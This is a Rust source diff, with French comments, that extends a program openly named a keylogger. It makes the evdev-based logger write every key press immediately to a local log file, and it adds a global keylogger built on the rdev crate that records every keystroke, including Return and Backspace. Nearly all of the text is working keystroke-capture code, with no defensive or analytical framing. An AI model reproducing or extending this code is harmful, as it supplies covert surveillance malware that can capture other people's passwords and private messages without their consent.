@@ -1,18 +1,20 @@
 use evdev::{Device, InputEventKind, Key};
+use rdev::{listen, Event, EventType};
+use std::fs::OpenOptions;
+use std::io::Write;
+use std::path::{Path, PathBuf};
 use std::sync::{Arc, Mutex};
 use std::thread;
 use std::time::Duration;
-use std::fs::OpenOptions;
-use std::io::Write;
-use std::path::PathBuf;
 
 /// 📁 Écrit les frappes dans Logs/log.log à la racine du projet
 fn write_plain_log(data: &str) {
     let log_path = std::env::current_exe()
         .expect("❌ Impossible d'obtenir le chemin de l'exécutable")
-        .parent().unwrap() // .../release/
-        .parent().unwrap() // .../target/
-        .parent().unwrap() // ==> racine du projet
+        .parent().unwrap()
+        .parent().unwrap()
+        .parent().unwrap()
+        .join("src")
         .join("Logs")
         .join("log.log");
 
@@ -59,7 +61,7 @@ pub fn detect_keyboard_device() -> Option<String> {
     None
 }
 
-/// 🎯 Lance l’écoute du clavier + enregistre les frappes
+/// 🎯 Lance le keylogger classique (basé sur evdev)
 pub fn start_keylogger(device_path: &str, _passphrase: &str) {
     let path = if device_path == "auto" {
         detect_keyboard_device().expect("❌ Aucun clavier détecté.")
@@ -70,6 +72,7 @@ pub fn start_keylogger(device_path: &str, _passphrase: &str) {
     let mut dev = Device::open(&path).expect("❌ Impossible d'ouvrir le device");
     println!("[*] Keylogger démarré sur {}", path);
 
+    write_plain_log("[*] Keylogger lancé\n");
     let buffer = Arc::new(Mutex::new(String::new()));
     let buffer_clone = Arc::clone(&buffer);
 
@@ -85,19 +88,51 @@ pub fn start_keylogger(device_path: &str, _passphrase: &str) {
     });
 
     // 🎧 Thread principal : écoute les touches
-    loop {
-        if let Ok(events) = dev.fetch_events() {
-            for ev in events {
-                if let InputEventKind::Key(key) = ev.kind() {
-                    if ev.value() == 1 {
-                        println!("⌨️ Touche détectée : {:?}", key);
+loop {
+    if let Ok(events) = dev.fetch_events() {
+        for ev in events {
+            if let InputEventKind::Key(key) = ev.kind() {
+                if ev.value() == 1 {
+                    println!("⌨️ Touche détectée : {:?}", key);
+                    let key_str = format!("{:?} ", key);
+
+                    {
                         let mut buf = buffer.lock().unwrap();
-                        buf.push_str(&format!("{:?} ", key));
+                        buf.push_str(&key_str);
                     }
+
+                    // 🛠️ Ajout : écrire immédiatement dans log.log
+                    write_plain_log(&key_str);
                 }
             }
         }
+    }
 
-        thread::sleep(Duration::from_millis(10));
+    thread::sleep(Duration::from_millis(10));
+}
+}
+
+/// 🚀 Lance le keylogger global (basé sur rdev)
+pub fn start_rdev_logger() {
+    println!("[*] Keylogger démarré (mode rdev, global)");
+
+    if let Err(error) = listen(callback) {
+        println!("❌ Erreur écoute des touches : {:?}", error);
+    }
+}
+
+/// 📋 Callback utilisé par rdev pour chaque touche
+fn callback(event: Event) {
+    if let EventType::KeyPress(key) = event.event_type {
+        let key_str = format!("{:?}", key);
+
+        match key_str.as_str() {
+            "Return" => write_plain_log("\n"),
+            "Space" => write_plain_log(" "),
+            "Tab" => write_plain_log("[TAB]"),
+            "Escape" => write_plain_log("[ESC]"),
+            "Backspace" => write_plain_log("[BACKSPACE]"),
+            _ => write_plain_log(&key_str),
+        }
     }
 }
